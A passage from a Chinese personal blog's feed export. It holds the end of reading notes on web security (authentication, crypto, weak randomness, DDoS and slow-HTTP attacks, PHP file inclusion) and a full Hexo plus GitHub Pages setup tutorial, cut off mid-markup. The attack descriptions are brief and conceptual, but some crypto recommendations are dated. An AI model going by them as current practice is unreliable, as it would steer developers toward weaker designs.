title="防御："></a>防御：</h4><p>白名单、上传目录不可写不可执行、单独设置文件域名、随机数写文件名白名单类型</p><h3 id="10-认证与会话管理"><a href="#10-认证与会话管理" class="headerlink" title="10.认证与会话管理"></a>10.认证与会话管理</h3><p><code>Authentication</code></p><p>认证实际上就是一个验证凭证的过程</p><p><code>单/双/多因素认证</code></p><p>密码策略：</p><p>OWASP 推荐策略    密码必须以不可逆的加密算法，或是单向散列函数算法，加密后存放于数据库</p><p>加salt hash</p><p><code>session</code></p><p><code>Session Fixation</code> 攻击</p><p>Session 保持攻击</p><p><code>SSO</code>（单点登录）</p><h3 id="11-访问控制"><a href="#11-访问控制" class="headerlink" title="11.访问控制"></a>11.访问控制</h3><p><code>Authorization</code> 读、写、执行</p><p>垂直和水平越权     –最小权限原则</p><p>OAuth：授权第三方应用</p><h3 id="12-加密算法与随机数"><a href="#12-加密算法与随机数" class="headerlink" title="12.加密算法与随机数"></a>12.加密算法与随机数</h3><p>分组加密算法有：DES,3-DES,Blowfish,IDEA,AES等<br> 流密码加密算法：RC4,ORYX,SEAL等</p><p><code>Reused Key Attack</code></p><p><code>Bit-flipping Attack</code></p><p>ECB模式缺陷在于 电码薄式的方式 调换明文位置，密文位置调换，如此变动可反向推算</p><p><code>Padding Oracle Attack</code></p><p><code>MD5 Length Extention Attack</code></p><p>密钥等不要硬编码在程序代码中</p><p>不要使用<code>ECB</code>模式</p><p>不要使用流密码</p><p>使用<code>HMAC-SHA1</code>代替<code>MD5</code>甚至代替<code>SHA-1</code></p><p>不要使用相同的<code>key</code>做不同的事情</p><p><code>salts</code>与 <code>IV</code> 要随机产生</p><p>不要自己实现加密算法，尽量使用安全专家已实现好的库</p><p>不要依赖系统的保密性</p><p>使用<code>CBC</code>模式的<code>AES256</code>加密</p><p>使用<code>HMAC-SHA512</code>检查完整性</p><p>使用带<code>salt</code>的<code>SHA-256</code>或<code>SHA-512</code>用于<code>Hashing</code></p><h3 id="13-伪随机数问题"><a href="#13-伪随机数问题" class="headerlink" title="13.伪随机数问题"></a>13.伪随机数问题</h3><p>弱随机问题，纯数字4-6位都是属于弱随机</p><p>伪随机可由时间时刻推导的，php中的 <code>microtime()</code> 由一个微秒数和系统当前秒数组合</p><p>PHP中有<code>rand()</code>（范围：32767）和<code>mt_rand()</code>（范围2147483647）的随机数算法。</p><p><code>mt_rand()</code> 函数通过<code>seed</code>来计算出的伪随机数，其值固定，多次计算所得值也固定。当在统一进程中，同一个<code>seed</code>通过<code>mt_rand()</code>所生成的值都是固定的。</p><h3 id="14-web框架安全"><a href="#14-web框架安全" class="headerlink" title="14.web框架安全"></a>14.web框架安全</h3><p>产品的安全讨论，在MVC中变量等地方容易出现XSS等问题，在对的地方做对的事情，针对性的处理安全隐患，做好程序的过滤和拦截，前端拦截只是对正常用户误操作的提示，节省服务器资源，但同时必须做好后端对参数的检查过滤。在常见的漏洞中，每个部分的功能与可能发生的漏洞对应做好检查和防御</p><p>Struts2 命令执行漏洞</p><p>Spring MVC 命令执行漏洞</p><p>Django 命令执行漏洞</p><h3 id="15-拒绝服务攻击（DDOS）"><a href="#15-拒绝服务攻击（DDOS）" class="headerlink" title="15.拒绝服务攻击（DDOS）"></a>15.拒绝服务攻击（DDOS）</h3><h4 id="DDOS-分布式拒绝服务攻击"><a href="#DDOS-分布式拒绝服务攻击" class="headerlink" title="DDOS 分布式拒绝服务攻击"></a>DDOS 分布式拒绝服务攻击</h4><p>有<code>SYN flood</code>、<code>UDP flood</code>、<code>ICMP flood</code>等，之前小东的网站遇到过<code>NTP flood</code>的攻击，放大倍数在700左右，最后直接关了服务器的NTP服务。</p><p>例如对于<code>SYN flood</code> 有<code>SYN cookie/SYN proxy</code>、<code>safereset</code>等算法，大致思想史根据访问频率来判断是否及时丢弃来自该IP的包，在众多对抗DDOS的产品中，都是根据DDOS的特征结合相应的算法来进行流量清洗。对抗DDOS的网络设备可串联或者并联在网络的出口处。</p><h4 id="应用层的DDOS"><a href="#应用层的DDOS" class="headerlink" title="应用层的DDOS"></a>应用层的DDOS</h4><p>发生在应用层，三次TCP握手已经完成，也叫做<code>CC攻击</code>(<code>Challenge Collapasar</code>)，其原理就是对于web应用上比较耗费资源的页面进行频繁的访问，导致服务器的资源耗尽而造成的DDOS攻击。还有就是黑客入侵了某个流量非常大的网站，然后内嵌攻击目标的网站<code>iframe</code>网页，导致目标网站直接拒绝服务。</p><h4 id="资源耗尽型攻击："><a href="#资源耗尽型攻击：" class="headerlink" title="资源耗尽型攻击："></a>资源耗尽型攻击：</h4><p>构造<code>畸形HTTP</code>请求（不完整<code>HTTP</code>请求），服务端认为<code>HTTP Header</code>没有结束，便会保持连接不释放，当构造多个连接后，服务器连接数达到上限，其他正常客户端便没法儿和服务器建立连接，以此造成业务影响。</p><p>例如：<code>HTTP POST DOS</code>，这个的原理是构造一个<code>content-length</code>很大的包，但是以<code>10~100s</code>不等间隔发一个字节，保持连接不断开，以此占用<code>WEB Server</code>的可用连接数，导致<code>DOS</code>，这种情况可使用WEB应用防火墙</p><h4 id="Server-Limit-DOS"><a href="#Server-Limit-DOS" class="headerlink" title="Server Limit DOS"></a>Server Limit DOS</h4><p><code>Cookie</code>也能造成<code>DOS</code>，当限制<code>header</code>头大小的时候，一个超长的<code>cookie</code>，服务器会返回<code>4xx</code>错误</p><h4 id="ReDOS"><a href="#ReDOS" class="headerlink" title="ReDOS"></a>ReDOS</h4><p>正则表达式都是基于<code>NFA</code>（<code>Nondeterminstic Finite Automanton</code>）的，它是一个状态机，某些正则表达式写得不好，在黑客的精心构造下也有可能造成资源消耗过大而导致<code>DOS</code>，存在ReDOS的写法开发人员应当注意，参考文章《<a href="http://www.freebuf.com/articles/network/124422.html" target="_blank" rel="noopener">浅析ReDoS的原理与实践</a>》</p><hr><h3 id="16-PHP安全"><a href="#16-PHP安全" class="headerlink" title="16.PHP安全"></a>16.PHP安全</h3><p>文件包含漏洞：本地文件包含、远程文件包含</p><p>%00截断     </p><p>操作系统对目录最大长度的限制，达到截断的目的，windows为256字节、linux下4096字节达到最大字节，最大值长度之后的字符将被丢弃</p><p>目录遍历漏洞：可返回上层目录，用不同的编码来绕过，php配置了open_basedir时，可使这种攻击无效</p><p>要解决文件包含漏洞，避免包含动态的变量</p><p>PHP伪协议</p><p>PHP现在很多中小型企业都在使用，这个脚本语言开发程序非常方便快捷，封装了很多的内置函数，然而就是这些内置函数在不恰当情况下使用，就导致了应用漏洞存在，常见有文件包含，变量覆盖，代码执行的漏洞 </p><h3 id="17-互联网公司的运营"><a href="#17-互联网公司的运营" class="headerlink" title="17.互联网公司的运营"></a>17.互联网公司的运营</h3><p>涉及到宏观安全思维，企业安全管理、安全开发和安全运营</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>hexo + github 搭建个人博客</title>
    <link href="http://yoursite.com/2018/08/06/hexo-github-%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>http://yoursite.com/2018/08/06/hexo-github-搭建博客/</id>
    <published>2018-08-06T14:40:02.000Z</published>
    <updated>2018-08-13T15:08:26.088Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>win8.1专业版   64位   </p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>1.首先你得有一个github账号,注册详情见百度</p><p>2.下载安装 git for windows  ，笔者用的版本是Git-2.18.0-64</p><p>一路默认安装即可</p><p>验证安装：</p><p>在桌面任意位置右击选项中有 Git  Bash Here  </p><p>cmd下(win+R打开，回车打开)</p><p><code>git --version</code></p><p>3.下载安装node.js      笔者用的是node-v10.7.0-x64</p><p>验证安装： cmd下</p><p><code>node -v</code></p><p>4.npm会默认安装</p><h1 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h1><p>在github下新建仓库，点击头像，选择your repository</p><p>New repository</p><p>注意，仓库名格式必须是$github用户名.github.io  这就是以后访问的博客地址</p><p>注册的邮箱是必须验证才会成功的</p><p>仓库创建成功不会立即生效，需要等待10分钟左右</p><h1 id="ssh-key"><a href="#ssh-key" class="headerlink" title="ssh key"></a>ssh key</h1><p>配置ssh  key 用于本地与github进行数据交换</p><p>在windows下的Git Bash下执行如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;liuxianan&quot;#你的github用户名</span><br><span class="line">git config --global user.email  &quot;xxx@qq.com&quot;#填写你的github注册邮箱</span><br></pre></td></tr></table></figure><p>生成ssh密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/. ssh#检查本机已存在的ssh密钥</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;#生成密钥</span><br></pre></td></tr></table></figure><p>连续按回车三次（使用默认ssh密钥生成策略），密钥生成成功，存于本地用户目录(~)，打开.ssh\id_rsa.pub文件，并复制其中内容</p><p>打开你的github主页，进入个人设置-&gt; SSH and GPG keys -&gt; New SSH key： </p><p>title任意填写，将内容复制到key中即可</p><h1 id="测试ssh"><a href="#测试ssh" class="headerlink" title="测试ssh"></a>测试ssh</h1><p>windows的GitBash下执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com #注意邮箱地址不用改</span><br></pre></td></tr></table></figure><p>如果提示<code>Are you sure you want to continue connecting (yes/no)?</code>，输入yes，然后会看到：</p><blockquote><p>Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access.</p></blockquote><p>看到这个信息说明SSH已配置成功！</p><h1 id="使用Hexo"><a href="#使用Hexo" class="headerlink" title="使用Hexo"></a>使用Hexo</h1><p>以下所有命令建议在git bash下运行</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>​    验证安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>​        在本地主机上建立一个blog文件夹，用于日后代码，博客的存放</p><p>​        进入此目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>​        此目录会自动生成hexo相关文件</p><p>​        注：此处目录中会存在一个_config.yml的文件，为hexo的主配置文件，以后我们称其为站点配置文件</p><h2 id="本地预览"><a href="#本地预览" class="headerlink" title="本地预览"></a>本地预览</h2><p>​    hexo目录中执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g#生成静态页面</span><br><span class="line">hexo s#启动本地预览服务</span><br></pre></td></tr></table></figure><p>​    执行命令后，hexo会在public文件夹生成相关html文件，用于本地预览与后期提交github</p><p>​    浏览器访问<a href="http://127.0.0.1:4000，即可看到hexo默认生成页面hello,world" target="_blank" rel="noopener">http://127.0.0.1:4000，即可看到hexo默认生成页面hello,world</a></p><p>如若出错，见文章底部</p><h1 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h1><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &apos;my-first-blog&apos;</span><br></pre></td></tr></table></figure><p>‘ ‘中为你本篇博客的名称，执行完成后，会自动在\hexo\source_posts\目录下生成.md文件，</p><p>只要打开这个文件就可以写博客了</p><h1 id="上传到github"><a href="#上传到github" class="headerlink" title="上传到github"></a>上传到github</h1><h2 id="上传前的配置"><a href="#上传前的配置" class="headerlink" title="上传前的配置"></a>上传前的配置</h2><p>配置站点配置文件_config.yml中的deploy部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:yourname/yourname.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>安装上传插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><p>在hexo根目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>会将有所改动的内容全部提交至github</p><h1 id="常用hexo命令"><a href="#常用hexo命令" class="headerlink" title="常用hexo命令"></a>常用hexo命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;postName&quot;#新建文章</span><br><span class="line">hexo new page &quot;pageName&quot;#新建页面</span><br><span class="line">hexo generate#生成静态页面至public目录</span><br><span class="line">hexo server#开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）</span><br><span class="line">hexo deploy#部署到GitHub</span><br><span class="line">hexo help#查看帮助</span><br><span class="line">hexo version#查看Hexo的版本</span><br><span class="line">hexo clean#清除缓存</span><br><span class="line"></span><br><span class="line">缩写：</span><br><span class="line">hexo n == hexo new</span><br><span class="line">hexo g == hexo generate</span><br><span class="line">hexo s == hexo server</span><br><span class="line">hexo d == hexo deploy</span><br><span class="line"></span><br><span class="line">组合命令：</span><br><span class="line">hexo s -g#生成并本地预览</span><br><span class="line">hexo d -g#生成并上传</span><br></pre></td></tr></table></figure><h1 id="更改默认hexo主题及优化"><a href="#更改默认hexo主题及优化" class="headerlink" title="更改默认hexo主题及优化"></a>更改默认hexo主题及优化</h1><h2 id="主题下载"><a href="#主题下载" class="headerlink" title="主题下载"></a>主题下载</h2><p>进入hexo根目录</p><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><p>执行完成后会在hexo\themes\ 目录下生成next目录</p><p>next目录下也会存在一个_config.yml文件，这是next主题的主配置文件，以后我们称为主题配置文件</p><h2 id="主题应用"><a href="#主题应用" class="headerlink" title="主题应用"></a>主题应用</h2><p>配置站点配置文件</p><p>寻找theme字段，将其值修改为next（next前后都有一个空格，否则会报错）</p><h2 id="主题预览"><a href="#主题预览" class="headerlink" title="主题预览"></a>主题预览</h2><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean#清除缓存</span><br><span class="line">hexo g#重新生成代码</span><br><span class="line">hexo s#部署到本地</span><br></pre></td></tr></table></figure><p>浏览器访问 <a href="http://127.0.0.1:4000" target="_blank" rel="noopener">http://127.0.0.1:4000</a> 查看效果</p><h2 id="主题简单优化"><a href="#主题简单优化" class="headerlink" title="主题简单优化"></a>主题简单优化</h2><h3 id="设置布局"><a href="#设置布局" class="headerlink" title="设置布局"></a>设置布局</h3><p>主题配置文件中</p><p>寻找 Scheme 字段，next提供三种默认主题布局，将你想使用的布局取消注释即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#scheme: Muse</span><br><span class="line">#scheme: Mist</span><br><span class="line">scheme: Pisces</span><br></pre></td></tr></table></figure><ul><li>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li><li>Mist - Muse 的紧凑版本，整洁有序的单栏外观</li><li>Pisces - 双栏 Scheme，小家碧玉似的清新</li></ul><h3 id="设置显示语言"><a href="#设置显示语言" class="headerlink" title="设置显示语言"></a>设置显示语言</h3><p>站点配置文件中</p><p>寻找<code>language</code> 字段，设置其值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">language: zh-Hans</span><br></pre></td></tr></table></figure><p>语言文件位于hexo\themes\next\languages目录下</p><h3 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h3><p>主题配置文件中</p><p>寻找menu字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: /#主页</span><br><span class="line">  archives: /archives#归档页</span><br><span class="line">  #about: /about#关于页</span><br><span class="line">  #categories: /categories#分类页</span><br><span class="line">  tags: /tags#标签页</span><br><span class="line">  #commonweal: /404.html#公益404</span><br></pre></td></tr></table></figure><p>除主页与归档页外，其余页面需要手动创建</p><p>每行中 || 后的内容为指定此menu的图标</p><h4 id="添加标签页"><a href="#添加标签页" class="headerlink" title="添加标签页"></a>添加标签页</h4><h5 id="新建页面"><a href="#新建页面" class="headerlink" title="新建页面"></a>新建页面</h5><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\tags目录中生成index.md文件</p><h5 id="设置页面类型"><a href="#设置页面类型" class="headerlink" title="设置页面类型"></a>设置页面类型</h5><p>修改此index.md文件为(添加type行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">date: 2016-11-15 19:10:05</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h5 id="设置具体博客文章tags"><a href="#设置具体博客文章tags" class="headerlink" title="设置具体博客文章tags"></a>设置具体博客文章tags</h5><p>对于hexo\source_post目录下具体博客文章设置tags(设置tags行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h4 id="添加分类页面"><a href="#添加分类页面" class="headerlink" title="添加分类页面"></a>添加分类页面</h4><h5 id="新建页面-1"><a href="#新建页面-1" class="headerlink" title="新建页面"></a>新建页面</h5><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\categories目录中生成index.md文件</p><h5 id="设置页面类型-1"><a href="#设置页面类型-1" class="headerlink" title="设置页面类型"></a>设置页面类型</h5><p>修改此index.md文件为(添加categories行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line">date: 2016-11-15 19:11:13</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h5 id="设置具体博客文章categories"><a href="#设置具体博客文章categories" class="headerlink" title="设置具体博客文章categories"></a>设置具体博客文章categories</h5><p>对于hexo\source_post目录下具体博客文章设置categories(设置categories行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br><span class="line">categories: 搭建博客</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h4 id="添加关于页面"><a href="#添加关于页面" class="headerlink" title="添加关于页面"></a>添加关于页面</h4><h5 id="添加页面"><a href="#添加页面" class="headerlink" title="添加页面"></a>添加页面</h5><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\about目录中生成index.md文件</p><h5 id="修改index-md文件"><a href="#修改index-md文件" class="headerlink" title="修改index.md文件"></a>修改index.md文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: about</span><br><span class="line">date: 2016-11-15 19:08:50</span><br><span class="line">---</span><br><span class="line">## 关于我</span><br><span class="line"></span><br><span class="line">一只学习的小菜鸟，欢迎分享知识。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QQ：</span><br><span class="line">Email:</span><br></pre></td></tr></table></figure><h3 id="设置站内搜索"><a href="#设置站内搜索" class="headerlink" title="设置站内搜索"></a>设置站内搜索</h3><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure><p>站点配置文件中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure><h3 id="hexo-首页文章只显示一部分"><a href="#hexo-首页文章只显示一部分" class="headerlink" title="hexo 首页文章只显示一部分"></a>hexo 首页文章只显示一部分</h3><p>在博客文章适当位置添加<code>&lt;!--more--&gt;</code> 标记即可，可在文首加———————-</p><p>然后再添加&lt;! –more–&gt;  即可实现只显示标题的效果</p><h3 id="网站底部字数统计（非必须）"><a href="#网站底部字数统计（非必须）" class="headerlink" title="网站底部字数统计（非必须）"></a>网站底部字数统计（非必须）</h3><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure><p>hexo\themes\next\/layout_partials\footer.swig文件中末尾添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;theme-info&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;powered-by&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;span class=&quot;post-count&quot;&gt;博客全站共&#123;&#123; totalcount(site) &#125;&#125;字&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="修改文章底部的带-号的标签（非必须）"><a href="#修改文章底部的带-号的标签（非必须）" class="headerlink" title="修改文章底部的带#号的标签（非必须）"></a>修改文章底部的带#号的标签（非必须）</h3><p>修改hexo\themes\next\layout_macro\post.swig文件，搜索<code>rel=&quot;tag&quot;&gt;#</code> ，改为<code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code> </p><h3 id="在每篇文章末尾统一添加“本文结束”标记（非必须）"><a href="#在每篇文章末尾统一添加“本文结束”标记（非必须）" class="headerlink" title="在每篇文章末尾统一添加“本文结束”标记（非必须）"></a>在每篇文章末尾统一添加“本文结束”标记（非必须）</h3><p>在hexo\themes\next\layout_macro目录下，新建<code>passage-end-tag.swig</code> ，并添加如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>接着打开hexo\themes\next\layout_macro\post.swig<code>文件，在</code>post-body 之后添加 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include &apos;passage-end-tag.swig&apos; %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>打开主题配置文件，在末尾添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 文章末尾添加“本文结束”标记</span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure><h3 id="主页文章添加阴影效果（非必须）"><a href="#主页文章添加阴影效果（非必须）" class="headerlink" title="主页文章添加阴影效果（非必须）"></a>主页文章添加阴影效果（非必须）</h3><p>打开hexo\themes\next\source\css_custom\custom.styl文件，添加代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 主页文章添加阴影效果</span><br><span class="line"> .post &#123;</span><br><span class="line">   margin-top: 60px;</span><br><span class="line">   margin-bottom: 60px;</span><br><span class="line">   padding: 25px;</span><br><span class="line">   -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);</span><br><span class="line">   -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="设置网站图标（非必须）"><a href="#设置网站图标（非必须）" class="headerlink" title="设置网站图标（非必须）"></a>设置网站图标（非必须）</h3><p>在<a href="http://www.easyicon.net/" target="_blank" rel="noopener">EasyIcon</a>中找一张（32*32）和一张（16x16）的ico图标,或者去别的网站下载或者制作，并将图标名称改为<code>favicon32x32.ico</code>和<code>favicon16x16.ico</code>，然后把图标放在hexo\themes\next\source\images 里，并且修改主题配置文件： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">icon: </span><br><span class="line">mall: /images/favicon16x16.ico</span><br><span class="line">medium: /images/favicon32x32.ico</span><br></pre></td></tr></table></figure><h3 id="实现统计功能（非必须）"><a href="#实现统计功能（非必须）" class="headerlink" title="实现统计功能（非必须）"></a>实现统计功能（非必须）</h3><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure><p>主题配置文件中，添加代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Post wordcount display settings</span><br><span class="line"># Dependencies: https://github.com/willin/hexo-wordcount</span><br><span class="line">post_wordcount:</span><br><span class="line">  item_text: true</span><br><span class="line">  wordcount: true</span><br><span class="line">  min2read: true</span><br></pre></td></tr></table></figure><h3 id="设置侧边栏（非必须）"><a href="#设置侧边栏（非必须）" class="headerlink" title="设置侧边栏（非必须）"></a>设置侧边栏（非必须）</h3><p>主题配置文件中</p><p>设置侧边栏在左侧或右侧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 